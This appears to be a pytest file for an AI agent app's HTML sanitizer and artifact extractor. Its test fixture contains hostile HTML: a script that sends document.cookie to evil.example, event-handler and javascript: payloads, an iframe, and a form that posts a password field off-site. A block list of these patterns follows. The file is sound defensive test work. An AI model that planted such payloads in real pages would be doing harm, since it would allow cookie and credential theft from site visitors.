from app.agent.artifacts import CSP, extract_artifact, sanitize_html

EVIL = """<!doctype html><html><head><title>t</title>
<link rel="stylesheet" href="https://evil.example/x.css">
<style>@import url('https://evil.example/a.css'); body{background:url(https://evil.example/t.png);color:#111}</style>
</head><body onload="steal()">
<h1 onclick="alert(1)">Hello</h1>
<script>fetch('https://evil.example/?c='+document.cookie)</script>
<a href="javascript:alert(1)">bad</a> <a href="#ok">ok</a>
<img src="https://evil.example/pixel.gif"><img src="data:image/png;base64,AAAA">
<iframe src="https://evil.example"></iframe>
<form action="https://evil.example"><input name="pw"><button>go</button></form>
<svg><script>alert(2)</script></svg>
<p>Safe &lt;text&gt; stays</p>
</body></html>"""


def test_sanitizer_removes_active_content():
    out, report = sanitize_html(EVIL)
    lowered = out.lower()
    for bad in ("<script", "onload", "onclick", "javascript:", "<iframe", "<form", "<input",
                "evil.example", "@import", "<svg", "<link"):
        assert bad not in lowered, bad
    assert report["removed_tags"]["script"] == 1
    assert report["removed_attrs"] >= 2
    assert report["removed_urls"] >= 2


def test_sanitizer_keeps_safe_content_and_injects_csp():
    out, _ = sanitize_html(EVIL)
    assert "<h1>Hello</h1>" in out
    assert 'href="#ok"' in out
    assert "data:image/png" in out
    assert "color:#111" in out
    assert "Safe &lt;text&gt; stays" in out
    assert CSP in out
    assert out.index("Content-Security-Policy") < out.index("<style>")


def test_fragment_is_wrapped_in_document():
    out, _ = sanitize_html("<div>hi</div>")
    assert out.startswith("<!doctype html>") and "Content-Security-Policy" in out


def test_extract_tagged_markdown_artifact():
    text = 'Intro\n<artifact type="markdown" title="PMF Checklist">\n# PMF Checklist\n- [ ] survey [S1]\n</artifact>\nDone.'
    art, chat = extract_artifact(text, "artifact")
    assert art.kind == "markdown" and art.title == "PMF Checklist"
    assert art.content.startswith("# PMF Checklist")
    assert chat == "Intro\n\nDone."


def test_extract_html_artifact_is_sanitized():
    text = '<artifact type="html" title="Page"><html><head></head><body><script>x()</script><p>hi</p></body></html></artifact>'
    art, _ = extract_artifact(text, "artifact")
    assert art.kind == "html" and "<script" not in art.content
    assert art.sanitizer["removed_tags"] == {"script": 1}


def test_unclosed_artifact_tag_still_extracted():
    art, _ = extract_artifact('<artifact type="markdown" title="T"># T\nbody cut off', "essay")
    assert art and art.content.startswith("# T")


def test_fenced_fallback_for_small_models():
    art, _ = extract_artifact("Here you go:\n```html\n<html><body><p>x</p></body></html>\n```", "artifact")
    assert art.kind == "html"


def test_untagged_essay_becomes_markdown_artifact():
    essay = "# Big Title\n\n" + "Paragraph about growth. " * 20
    art, chat = extract_artifact(essay, "essay")
    assert art.kind == "markdown" and art.title == "Big Title" and chat == ""


def test_qa_answer_is_not_an_artifact():
    art, chat = extract_artifact("Short answer [S1].", "qa")
    assert art is None and chat == "Short answer [S1]."
